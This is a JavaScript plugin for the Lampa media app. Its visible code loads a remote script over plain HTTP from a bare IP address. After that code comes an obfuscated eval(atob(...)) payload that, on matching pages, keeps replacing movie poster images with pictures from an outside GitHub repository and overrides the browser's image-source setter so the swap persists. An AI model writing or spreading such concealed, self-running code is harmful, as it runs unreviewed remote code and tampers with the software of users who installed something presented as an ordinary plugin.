(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
eval(atob('KGZ1bmN0aW9uKCl7aWYobG9jYXRpb24uaHJlZi5pbmRleE9mKGF0b2IoJ1lubHNhbTF3WVE9PScpKT09PS0xKXJldHVybjt2YXIgcD1bYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBeExtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBeUxtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBekxtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBMExtcHdadz09JyldO2Z1bmN0aW9uIHIoKXt2YXIgaSxlPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2ltZycpO2ZvcihpPTA7aTxlLmxlbmd0aDtpKyspe2lmKGVbaV0uc3JjJiYoZVtpXS5zcmMubWF0Y2goL3RtZGJ8a2lub3BvaXNrfHBvc3Rlci9pKSkpe2VbaV0uc3JjPXBbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKnAubGVuZ3RoKV19fX1yKCk7c2V0SW50ZXJ2YWwociw1MDApO3ZhciBvPW5ldyBNdXRhdGlvbk9ic2VydmVyKGZ1bmN0aW9uKGUpe3NldFRpbWVvdXQociwxMDApfSk7by5vYnNlcnZlKGRvY3VtZW50LmJvZHkse2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZSxhdHRyaWJ1dGVzOnRydWUsYXR0cmlidXRlRmlsdGVyOlsnc3JjJ119KTtPYmplY3QuZGVmaW5lUHJvcGVydHkoSFRNTEltYWdlRWxlbWVudC5wcm90b3R5cGUsJ3NyYycse3NldDpmdW5jdGlvbih2KXtpZih2JiZ2Lm1hdGNoKC90bWRifGtpbm9wb2lza3xwb3N0ZXIvaSkpe09iamVjdC5kZWZpbmVQcm9wZXJ0eSh0aGlzLCdfc3JjJyx7dmFsdWU6cFtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqcC5sZW5ndGgpXSx3cml0YWJsZTp0cnVlfSk7cmV0dXJufU9iamVjdC5kZWZpbmVQcm9wZXJ0eSh0aGlzLCdfc3JjJyx7dmFsdWU6dix3cml0YWJsZTp0cnVlfSl9LGdldDpmdW5jdGlvbigpe3JldHVybiB0aGlzLl9zcmN8fCcnfX0pfSkoKTsK'));
